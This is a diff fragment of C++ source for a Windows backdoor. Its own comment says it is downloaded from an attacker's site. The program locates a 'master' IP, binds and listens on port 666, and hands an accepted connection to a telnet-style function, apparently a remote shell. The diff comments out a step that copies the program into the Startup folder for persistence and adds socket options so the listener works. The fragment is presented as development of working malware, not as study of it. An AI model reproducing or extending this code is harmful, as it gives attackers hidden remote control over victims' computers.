@@ -22,25 +22,28 @@ void telNet(SOCKET s)
 int main(int argc, char** argv)
 {
     /*running once after file is downloaded from the attacker's site*/
-    if (!isInStartUp(argv[0])) //check if the application is running from the startUp directory
+    /*if (!isInStartUp(argv[0])) //check if the application is running from the startUp directory
     {
         copyToStartUp(argv[0]);
         executeStartUpFile();
-    }
+    }*/
 
     WSADATA wsaData;
     WSAStartup(MAKEWORD(2, 2), &wsaData);
     sockaddr_in addressinfo;
     uint32_t mastersIP = findMastersIP();
-
+    int opt = 1;
     if (!mastersIP)
         return 1;
-    addressinfo.sin_addr.s_addr = inet_addr("0.0.0.0");
+    addressinfo.sin_addr.s_addr = getPrivateIP();
     addressinfo.sin_port = htons(666);
     addressinfo.sin_family = AF_INET;
 
     SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
+    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt)))
+        std::cout << "Sockopt error <" << WSAGetLastError() << ">" << std::endl;
     bind(s, (sockaddr*)&addressinfo, sizeof(addressinfo));
+    listen(s, 1);
     SOCKET master = accept(s, NULL, 0);
     if (!s | !master)
         return 1;
